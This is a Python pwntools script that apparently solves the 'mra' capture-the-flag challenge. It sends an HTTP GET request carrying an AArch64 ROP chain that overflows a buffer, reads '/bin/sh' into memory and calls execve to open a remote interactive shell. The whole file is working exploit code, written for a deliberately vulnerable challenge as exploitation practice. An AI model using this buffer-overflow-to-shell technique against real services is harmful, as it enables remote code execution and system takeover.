#!/usr/bin/env python3
from pwn import *

if len(sys.argv) == 1:
    s = process('qemu-aarch64-static mra', shell=True)
elif sys.argv[1] == 'gdb':
    s = process('qemu-aarch64-static -g 1234 mra', shell=True)
else:
    s = remote('mra.challenges.ooo', 8000)

'''
0x0000000000400bf8: sub sp, sp, #0x190; ret;
0x0000000000400cb4: ldur x3, [sp, #0xfffffffffffffff0]; ldur x2, [sp, #0xffffffffffffffd8]; ldur w1, [sp, #0xffffffffffffffe4]; ldur x0, [sp, #0xffffffffffffffe8]; blr x3; (+ ldp x29, x30, [sp, #-64]; sub sp, sp, #0x40; ret)
0x0000000000406558: ldur x8, [sp, #0xfffffffffffffff8]; ldur x0, [sp, #0xfffffffffffffff0]; svc #0; sub sp, sp, #0x10; ret;
'''

bss = 0x41d000

pop_x3_x2_w1_x0_blr_x3 = 0x400cb4
pop_x8_x0_svc = 0x406558
sub_sp_190 = 0x400bf8
read = 0x4064f8
ret = 0x4001cc

rop = b''
rop += p64(sub_sp_190) # x3
rop += b'A' * 0x10
rop += p64(pop_x3_x2_w1_x0_blr_x3)

rop2 = b''
# execve("/bin/sh", NULL, NULL)
rop2 += p64(bss + 0x400) # x0
rop2 += p64(221) # x8
rop2 += p64(0)
rop2 += p64(pop_x8_x0_svc)
rop2 += p64(0)
rop2 += p64(0) # x2
rop2 += p32(0)
rop2 += p32(0) # w1
rop2 += p64(0) # x0
rop2 += p64(ret) # x3
rop2 += p64(0) * 2
rop2 += p64(pop_x3_x2_w1_x0_blr_x3)
rop2 += p64(0)
# read(0, bss + 0x400, 0x100)
rop2 += p64(0x100) # x2
rop2 += p32(0)
rop2 += p32(bss + 0x400) # w1
rop2 += p64(0) # x0
rop2 += p64(read) # x3
rop2 += p64(0) * 2
rop2 += p64(pop_x3_x2_w1_x0_blr_x3)

payload = b''
payload += b'GET /api/isodd/'
payload += b'%\0'
payload += rop.rjust(0x78, b'A').replace(b'%', b'%25').replace(b'\0', b'%00')
payload += rop2.rjust(0x2a8 - len(payload), b'A')

s.send(payload)

time.sleep(0.1)
s.send('/bin/sh\0')

s.interactive()
